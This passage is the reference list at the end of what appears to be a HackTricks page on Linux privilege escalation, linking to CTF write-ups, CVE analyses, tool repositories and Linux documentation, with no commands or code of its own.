- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [What is a Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Get on the D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [How to manage ACLs on Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root through network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [What is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet by @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Logging Passwords On Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Details Of A Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)

{{#include ../../../banners/hacktricks-training.md}}
